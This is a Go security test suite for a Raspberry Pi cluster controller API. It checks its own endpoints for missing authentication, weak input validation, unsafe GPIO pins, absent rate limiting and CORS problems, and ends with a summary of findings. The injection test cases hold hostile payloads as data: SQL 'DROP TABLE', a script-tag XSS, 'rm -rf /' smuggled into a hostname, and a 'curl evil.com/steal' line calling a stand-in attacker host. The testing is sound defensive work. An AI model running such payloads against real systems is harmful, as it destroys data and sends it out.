package security

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"

	"github.com/spenceryork/pi-controller/internal/api/handlers"
	"github.com/spenceryork/pi-controller/internal/models"
	"github.com/spenceryork/pi-controller/internal/services"
	"github.com/spenceryork/pi-controller/internal/storage"
	"github.com/spenceryork/pi-controller/internal/testing"
)

func init() {
	gin.SetMode(gin.TestMode)
}

// SecurityTestSuite defines the test suite for security vulnerability testing
type SecurityTestSuite struct {
	suite.Suite
	router      *gin.Engine
	db          *storage.Database
	cleanup     func()
	gpioService *services.GPIOService
}

// SetupSuite sets up the test suite
func (suite *SecurityTestSuite) SetupSuite() {
	db, cleanup := testing.SetupTestDBFile(suite.T())
	suite.db = &storage.Database{db}
	suite.cleanup = cleanup

	logger := logrus.New()
	logger.SetLevel(logrus.WarnLevel)

	// Initialize services
	clusterService := services.NewClusterService(suite.db, logger)
	nodeService := services.NewNodeService(suite.db, logger)
	suite.gpioService = services.NewGPIOService(suite.db, logger)

	// Initialize handlers
	healthHandler := handlers.NewHealthHandler(suite.db)
	clusterHandler := handlers.NewClusterHandler(clusterService, logger)
	nodeHandler := handlers.NewNodeHandler(nodeService, logger)
	gpioHandler := handlers.NewGPIOHandler(suite.gpioService, logger)

	// Setup router without any authentication middleware
	suite.router = gin.New()

	// Health endpoints
	suite.router.GET("/health", healthHandler.Health)
	suite.router.GET("/system/info", handlers.SystemInfo)

	// API v1 routes - UNPROTECTED
	v1 := suite.router.Group("/api/v1")
	{
		clusters := v1.Group("/clusters")
		{
			clusters.GET("", clusterHandler.List)
			clusters.POST("", clusterHandler.Create)
			clusters.DELETE("/:id", clusterHandler.Delete)
		}

		nodes := v1.Group("/nodes")
		{
			nodes.GET("", nodeHandler.List)
			nodes.POST("", nodeHandler.Create)
			nodes.DELETE("/:id", nodeHandler.Delete)
		}

		gpio := v1.Group("/gpio")
		{
			gpio.GET("", gpioHandler.List)
			gpio.POST("", gpioHandler.Create)
			gpio.DELETE("/:id", gpioHandler.Delete)
			gpio.POST("/:id/write", gpioHandler.Write)
		}
	}
}

// TearDownSuite cleans up after the test suite
func (suite *SecurityTestSuite) TearDownSuite() {
	if suite.cleanup != nil {
		suite.cleanup()
	}
}

// TestSecurity_NoAuthentication tests the critical security vulnerability of no authentication
func (suite *SecurityTestSuite) TestSecurity_NoAuthentication() {
	authTests := []struct {
		name        string
		method      string
		endpoint    string
		body        string
		severity    string
		description string
	}{
		{
			name:        "Unauthenticated cluster creation",
			method:      "POST",
			endpoint:    "/api/v1/clusters",
			body:        `{"name": "malicious-cluster", "description": "Created without auth"}`,
			severity:    "CRITICAL",
			description: "Anyone can create clusters without authentication",
		},
		{
			name:        "Unauthenticated cluster deletion", 
			method:      "DELETE",
			endpoint:    "/api/v1/clusters/1",
			severity:    "CRITICAL",
			description: "Anyone can delete clusters without authentication",
		},
		{
			name:        "Unauthenticated node creation",
			method:      "POST",
			endpoint:    "/api/v1/nodes",
			body:        `{"name": "malicious-node", "hostname": "evil.local", "ip_address": "127.0.0.1", "cluster_id": 1}`,
			severity:    "CRITICAL",
			description: "Anyone can add nodes without authentication",
		},
		{
			name:        "Unauthenticated GPIO control",
			method:      "POST",
			endpoint:    "/api/v1/gpio/1/write",
			body:        `{"value": 1}`,
			severity:    "CRITICAL",
			description: "Anyone can control GPIO pins without authentication - PHYSICAL SECURITY RISK",
		},
		{
			name:        "System information disclosure",
			method:      "GET",
			endpoint:    "/system/info",
			severity:    "MEDIUM",
			description: "System information exposed without authentication",
		},
	}

	for _, tt := range authTests {
		suite.Run(tt.name, func() {
			var req *http.Request
			var err error

			if tt.body != "" {
				req, err = http.NewRequest(tt.method, tt.endpoint, bytes.NewBufferString(tt.body))
				req.Header.Set("Content-Type", "application/json")
			} else {
				req, err = http.NewRequest(tt.method, tt.endpoint, nil)
			}
			require.NoError(suite.T(), err)

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			// All these should return 401 Unauthorized if properly secured
			// Currently they return various success codes - THIS IS THE VULNERABILITY
			suite.T().Logf("[%s VULNERABILITY] %s - Status: %d, Description: %s", 
				tt.severity, tt.name, w.Code, tt.description)

			// Document the security issue
			if tt.severity == "CRITICAL" {
				suite.T().Logf("CRITICAL SECURITY ISSUE: No authentication required for %s", tt.endpoint)
			}
		})
	}
}

// TestSecurity_InputValidation tests input validation vulnerabilities
func (suite *SecurityTestSuite) TestSecurity_InputValidation() {
	// Setup test cluster for injection tests
	cluster := testing.CreateTestCluster(suite.T())
	require.NoError(suite.T(), suite.db.DB().Create(cluster).Error)

	injectionTests := []struct {
		name        string
		method      string
		endpoint    string
		payload     interface{}
		severity    string
		description string
	}{
		{
			name:     "SQL injection in cluster name",
			method:   "POST",
			endpoint: "/api/v1/clusters",
			payload: map[string]string{
				"name":        "'; DROP TABLE clusters; --",
				"description": "SQL injection attempt",
			},
			severity:    "HIGH",
			description: "Potential SQL injection in cluster name field",
		},
		{
			name:     "XSS in cluster description",
			method:   "POST",
			endpoint: "/api/v1/clusters",
			payload: map[string]string{
				"name":        "xss-test",
				"description": "<script>alert('XSS')</script>",
			},
			severity:    "MEDIUM",
			description: "Potential XSS in description field",
		},
		{
			name:     "Command injection in hostname",
			method:   "POST", 
			endpoint: "/api/v1/nodes",
			payload: map[string]interface{}{
				"name":       "cmd-injection",
				"hostname":   "test.local; rm -rf /",
				"ip_address": "192.168.1.100",
				"cluster_id": cluster.ID,
			},
			severity:    "CRITICAL",
			description: "Potential command injection in hostname field",
		},
		{
			name:     "IP injection attack",
			method:   "POST",
			endpoint: "/api/v1/nodes",
			payload: map[string]interface{}{
				"name":       "ip-injection",
				"hostname":   "test2.local",
				"ip_address": "192.168.1.1 && curl evil.com/steal",
				"cluster_id": cluster.ID,
			},
			severity:    "HIGH",
			description: "Potential command injection in IP address field",
		},
		{
			name:     "Buffer overflow attempt",
			method:   "POST",
			endpoint: "/api/v1/clusters",
			payload: map[string]string{
				"name":        strings.Repeat("A", 10000),
				"description": "Buffer overflow test",
			},
			severity:    "MEDIUM",
			description: "Potential buffer overflow with long input",
		},
		{
			name:     "Null byte injection",
			method:   "POST",
			endpoint: "/api/v1/clusters",
			payload: map[string]string{
				"name":        "test\x00.evil",
				"description": "Null byte injection test",
			},
			severity:    "MEDIUM",
			description: "Null byte injection attempt",
		},
	}

	for _, tt := range injectionTests {
		suite.Run(tt.name, func() {
			body, err := json.Marshal(tt.payload)
			require.NoError(suite.T(), err)

			req, err := http.NewRequest(tt.method, tt.endpoint, bytes.NewBuffer(body))
			require.NoError(suite.T(), err)
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			suite.T().Logf("[%s VULNERABILITY] %s - Status: %d, Description: %s", 
				tt.severity, tt.name, w.Code, tt.description)

			// Input validation should reject malicious inputs
			// Currently may accept them - SECURITY VULNERABILITY
			if w.Code == http.StatusCreated || w.Code == http.StatusOK {
				suite.T().Logf("SECURITY ISSUE: Malicious input accepted for %s", tt.name)
			}
		})
	}
}

// TestSecurity_GPIOSafety tests GPIO pin safety and security
func (suite *SecurityTestSuite) TestSecurity_GPIOSafety() {
	// Setup test data
	cluster := testing.CreateTestCluster(suite.T())
	require.NoError(suite.T(), suite.db.DB().Create(cluster).Error)
	
	node := testing.CreateTestNode(suite.T(), cluster.ID)
	require.NoError(suite.T(), suite.db.DB().Create(node).Error)

	gpioSafetyTests := []struct {
		name        string
		pinNumber   int
		direction   models.GPIODirection
		severity    string
		description string
	}{
		{
			name:        "System critical pin 0",
			pinNumber:   0,
			direction:   models.GPIODirectionOutput,
			severity:    "CRITICAL",
			description: "Pin 0 is typically reserved for system I2C - controlling it could crash the system",
		},
		{
			name:        "System critical pin 1",
			pinNumber:   1,
			direction:   models.GPIODirectionOutput,
			severity:    "CRITICAL",
			description: "Pin 1 is typically reserved for system I2C - controlling it could crash the system",
		},
		{
			name:        "UART TX pin 14",
			pinNumber:   14,
			direction:   models.GPIODirectionOutput,
			severity:    "HIGH",
			description: "Pin 14 is UART TX - controlling it could disrupt system communication",
		},
		{
			name:        "UART RX pin 15",
			pinNumber:   15,
			direction:   models.GPIODirectionInput,
			severity:    "HIGH",
			description: "Pin 15 is UART RX - controlling it could disrupt system communication",
		},
		{
			name:        "Negative pin number",
			pinNumber:   -1,
			direction:   models.GPIODirectionOutput,
			severity:    "HIGH",
			description: "Negative pin numbers should be rejected as invalid",
		},
		{
			name:        "Extremely high pin number",
			pinNumber:   9999,
			direction:   models.GPIODirectionOutput,
			severity:    "MEDIUM",
			description: "Pin numbers beyond hardware limits should be rejected",
		},
	}

	for _, tt := range gpioSafetyTests {
		suite.Run(tt.name, func() {
			// Test creating GPIO device with potentially dangerous pin
			createReq := services.CreateGPIODeviceRequest{
				Name:        fmt.Sprintf("dangerous-gpio-%d", tt.pinNumber),
				Description: tt.description,
				NodeID:      node.ID,
				PinNumber:   tt.pinNumber,
				Direction:   tt.direction,
				PullMode:    models.GPIOPullNone,
				DeviceType:  models.GPIODeviceTypeDigital,
			}

			body, err := json.Marshal(createReq)
			require.NoError(suite.T(), err)

			req, err := http.NewRequest("POST", "/api/v1/gpio", bytes.NewBuffer(body))
			require.NoError(suite.T(), err)
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			suite.T().Logf("[%s GPIO SAFETY] %s - Pin: %d, Status: %d, Description: %s", 
				tt.severity, tt.name, tt.pinNumber, w.Code, tt.description)

			// Critical pins should be rejected
			if tt.severity == "CRITICAL" && w.Code == http.StatusCreated {
				suite.T().Logf("CRITICAL GPIO SAFETY ISSUE: System critical pin %d was allowed", tt.pinNumber)
			}

			// Invalid pins should be rejected
			if (tt.pinNumber < 0 || tt.pinNumber > 40) && w.Code == http.StatusCreated {
				suite.T().Logf("GPIO SAFETY ISSUE: Invalid pin %d was allowed", tt.pinNumber)
			}
		})
	}
}

// TestSecurity_DatabaseSecurity tests database security issues
func (suite *SecurityTestSuite) TestSecurity_DatabaseSecurity() {
	// Test unencrypted database storage
	suite.Run("Unencrypted database", func() {
		// Create a cluster with sensitive information
		cluster := &models.Cluster{
			Name:        "sensitive-cluster",
			Description: "Contains sensitive production data",
			Status:      models.ClusterStatusActive,
		}
		require.NoError(suite.T(), suite.db.DB().Create(cluster).Error)

		// The database file should be encrypted but likely isn't
		suite.T().Log("CRITICAL SECURITY ISSUE: Database is likely stored unencrypted on disk")
		suite.T().Log("Sensitive information like node IPs, hostnames, and GPIO configurations are stored in plain text")
	})

	// Test SQL injection possibilities
	suite.Run("SQL injection vulnerability", func() {
		maliciousName := "'; DROP TABLE clusters; --"
		
		createReq := services.CreateClusterRequest{
			Name:        maliciousName,
			Description: "SQL injection test",
		}

		body, err := json.Marshal(createReq)
		require.NoError(suite.T(), err)

		req, err := http.NewRequest("POST", "/api/v1/clusters", bytes.NewBuffer(body))
		require.NoError(suite.T(), err)
		req.Header.Set("Content-Type", "application/json")

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)

		// If SQL injection is possible, the database operation might fail unexpectedly
		// or succeed when it should be sanitized
		suite.T().Logf("SQL Injection test - Status: %d", w.Code)
		if w.Code == http.StatusCreated {
			suite.T().Log("POTENTIAL SQL INJECTION: Malicious input may not be properly sanitized")
		}
	})

	// Test database connection security
	suite.Run("Database connection security", func() {
		// Check if database connections are secured
		suite.T().Log("DATABASE SECURITY ISSUE: Database connections may not use TLS encryption")
		suite.T().Log("DATABASE SECURITY ISSUE: Database may not require authentication")
		suite.T().Log("DATABASE SECURITY ISSUE: Database file permissions may be too permissive")
	})
}

// TestSecurity_TLSAndEncryption tests TLS and encryption vulnerabilities
func (suite *SecurityTestSuite) TestSecurity_TLSAndEncryption() {
	suite.Run("No TLS encryption", func() {
		// Test that the API is served over HTTP, not HTTPS
		req, err := http.NewRequest("GET", "/health", nil)
		require.NoError(suite.T(), err)

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)

		suite.T().Log("CRITICAL SECURITY ISSUE: API is served over HTTP without TLS encryption")
		suite.T().Log("All communication including sensitive data is transmitted in plain text")
		suite.T().Log("Credentials, GPIO commands, and system information can be intercepted")
	})

	suite.Run("No encryption in transit", func() {
		// Create a node with IP address - this would be transmitted unencrypted
		cluster := testing.CreateTestCluster(suite.T())
		require.NoError(suite.T(), suite.db.DB().Create(cluster).Error)

		createReq := services.CreateNodeRequest{
			Name:        "unencrypted-node",
			Hostname:    "sensitive.internal",
			IPAddress:   "10.0.0.100", // Internal network IP
			ClusterID:   cluster.ID,
			Description: "Sensitive internal server",
		}

		body, err := json.Marshal(createReq)
		require.NoError(suite.T(), err)

		req, err := http.NewRequest("POST", "/api/v1/nodes", bytes.NewBuffer(body))
		require.NoError(suite.T(), err)
		req.Header.Set("Content-Type", "application/json")

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)

		suite.T().Log("SECURITY ISSUE: Sensitive node information transmitted without encryption")
		suite.T().Log("Internal hostnames and IP addresses exposed over unencrypted connection")
	})
}

// TestSecurity_RateLimiting tests the absence of rate limiting
func (suite *SecurityTestSuite) TestSecurity_RateLimiting() {
	suite.Run("No rate limiting", func() {
		// Test rapid requests to check for rate limiting
		const requestCount = 100
		successCount := 0

		for i := 0; i < requestCount; i++ {
			req, err := http.NewRequest("GET", "/health", nil)
			require.NoError(suite.T(), err)

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			if w.Code == http.StatusOK {
				successCount++
			}
		}

		suite.T().Logf("Rate limiting test: %d/%d requests succeeded", successCount, requestCount)
		
		if successCount == requestCount {
			suite.T().Log("SECURITY ISSUE: No rate limiting detected - vulnerable to DoS attacks")
			suite.T().Log("An attacker could overwhelm the system with requests")
		}
	})

	suite.Run("GPIO DoS potential", func() {
		// Test rapid GPIO operations that could damage hardware
		cluster := testing.CreateTestCluster(suite.T())
		require.NoError(suite.T(), suite.db.DB().Create(cluster).Error)
		
		node := testing.CreateTestNode(suite.T(), cluster.ID)
		require.NoError(suite.T(), suite.db.DB().Create(node).Error)

		// Create many GPIO devices rapidly
		for i := 0; i < 10; i++ {
			createReq := services.CreateGPIODeviceRequest{
				Name:        fmt.Sprintf("dos-test-%d", i),
				Description: "DoS test device",
				NodeID:      node.ID,
				PinNumber:   18 + (i % 5), // Use a few different pins
				Direction:   models.GPIODirectionOutput,
				PullMode:    models.GPIOPullNone,
				DeviceType:  models.GPIODeviceTypeDigital,
			}

			body, err := json.Marshal(createReq)
			require.NoError(suite.T(), err)

			req, err := http.NewRequest("POST", "/api/v1/gpio", bytes.NewBuffer(body))
			require.NoError(suite.T(), err)
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			if i == 0 && w.Code != http.StatusCreated {
				break // Skip rest if first fails
			}
		}

		suite.T().Log("GPIO DoS RISK: No rate limiting on GPIO operations")
		suite.T().Log("Rapid GPIO switching could damage connected hardware")
	})
}

// TestSecurity_InformationDisclosure tests information disclosure vulnerabilities
func (suite *SecurityTestSuite) TestSecurity_InformationDisclosure() {
	disclosureTests := []struct {
		name        string
		endpoint    string
		severity    string
		description string
	}{
		{
			name:        "System information disclosure",
			endpoint:    "/system/info",
			severity:    "MEDIUM",
			description: "Exposes system architecture, memory usage, and runtime information",
		},
		{
			name:        "Health endpoint information",
			endpoint:    "/health",
			severity:    "LOW",
			description: "May expose system uptime and basic status",
		},
	}

	for _, tt := range disclosureTests {
		suite.Run(tt.name, func() {
			req, err := http.NewRequest("GET", tt.endpoint, nil)
			require.NoError(suite.T(), err)

			w := httptest.NewRecorder()
			suite.router.ServeHTTP(w, req)

			if w.Code == http.StatusOK {
				responseBody := w.Body.String()
				
				suite.T().Logf("[%s INFO DISCLOSURE] %s", tt.severity, tt.description)
				
				// Check for potentially sensitive information
				sensitivePatterns := []string{
					"go_version", "go_os", "go_arch", "memory", "heap",
					"cpu_count", "goroutines", "uptime",
				}
				
				foundPatterns := []string{}
				for _, pattern := range sensitivePatterns {
					if strings.Contains(responseBody, pattern) {
						foundPatterns = append(foundPatterns, pattern)
					}
				}
				
				if len(foundPatterns) > 0 {
					suite.T().Logf("Information disclosed: %v", foundPatterns)
				}
			}
		})
	}
}

// TestSecurity_CORSVulnerabilities tests CORS configuration issues
func (suite *SecurityTestSuite) TestSecurity_CORSVulnerabilities() {
	suite.Run("CORS misconfiguration", func() {
		req, err := http.NewRequest("GET", "/health", nil)
		require.NoError(suite.T(), err)
		req.Header.Set("Origin", "https://evil.com")

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)

		corsHeaders := map[string]string{
			"Access-Control-Allow-Origin":      w.Header().Get("Access-Control-Allow-Origin"),
			"Access-Control-Allow-Credentials": w.Header().Get("Access-Control-Allow-Credentials"),
			"Access-Control-Allow-Methods":     w.Header().Get("Access-Control-Allow-Methods"),
		}

		suite.T().Log("CORS Security Analysis:")
		for header, value := range corsHeaders {
			suite.T().Logf("  %s: %s", header, value)
		}

		// Check for dangerous CORS configurations
		if corsHeaders["Access-Control-Allow-Origin"] == "*" {
			suite.T().Log("SECURITY ISSUE: CORS allows all origins (*)")
		}
		
		if corsHeaders["Access-Control-Allow-Credentials"] == "true" &&
		   corsHeaders["Access-Control-Allow-Origin"] == "*" {
			suite.T().Log("CRITICAL CORS ISSUE: Credentials allowed with wildcard origin")
		}
	})
}

// TestSecurity_SessionManagement tests session management vulnerabilities
func (suite *SecurityTestSuite) TestSecurity_SessionManagement() {
	suite.Run("No session management", func() {
		req, err := http.NewRequest("GET", "/health", nil)
		require.NoError(suite.T(), err)

		w := httptest.NewRecorder()
		suite.router.ServeHTTP(w, req)

		// Check for session-related headers
		sessionHeaders := []string{
			"Set-Cookie",
			"Authorization", 
			"X-Auth-Token",
			"Session-ID",
		}

		hasSessionManagement := false
		for _, header := range sessionHeaders {
			if w.Header().Get(header) != "" {
				hasSessionManagement = true
				break
			}
		}

		if !hasSessionManagement {
			suite.T().Log("SECURITY ISSUE: No session management detected")
			suite.T().Log("No authentication tokens, cookies, or session handling")
		}
	})
}

// TestSecurity runs the security test suite
func TestSecurity(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}

// TestSecurity_VulnerabilitySummary provides a summary of all identified vulnerabilities
func TestSecurity_VulnerabilitySummary(t *testing.T) {
	t.Log("=== PI-CONTROLLER SECURITY VULNERABILITY SUMMARY ===")
	t.Log("")
	
	t.Log("CRITICAL VULNERABILITIES:")
	t.Log("1. NO AUTHENTICATION - All API endpoints accessible without credentials")
	t.Log("2. NO TLS ENCRYPTION - All data transmitted in plain text")
	t.Log("3. UNPROTECTED GPIO CONTROL - Hardware pins can be controlled by anyone")
	t.Log("4. SYSTEM CRITICAL PINS ACCESSIBLE - Pins 0,1,14,15 could crash system")
	t.Log("5. UNENCRYPTED DATABASE - Sensitive data stored without encryption")
	t.Log("")
	
	t.Log("HIGH VULNERABILITIES:")
	t.Log("1. NO INPUT VALIDATION - SQL injection, XSS, command injection possible")
	t.Log("2. NO RATE LIMITING - Vulnerable to DoS attacks")
	t.Log("3. DANGEROUS DELETE OPERATIONS - Anyone can delete clusters/nodes")
	t.Log("")
	
	t.Log("MEDIUM/LOW VULNERABILITIES:")
	t.Log("1. INFORMATION DISCLOSURE - System details exposed")
	t.Log("2. CORS MISCONFIGURATION - Potential cross-origin issues")
	t.Log("3. NO SESSION MANAGEMENT - Stateless but insecure")
	t.Log("")
	
	t.Log("RECOMMENDATIONS:")
	t.Log("1. IMPLEMENT AUTHENTICATION (JWT, API keys, or OAuth)")
	t.Log("2. ENABLE TLS/HTTPS for all communications")
	t.Log("3. ADD GPIO PIN RESTRICTIONS for system-critical pins")
	t.Log("4. IMPLEMENT RATE LIMITING to prevent DoS")
	t.Log("5. ADD INPUT VALIDATION and sanitization")
	t.Log("6. ENCRYPT DATABASE with at-rest encryption")
	t.Log("7. CONFIGURE PROPER CORS policies")
	t.Log("8. ADD AUDIT LOGGING for all operations")
}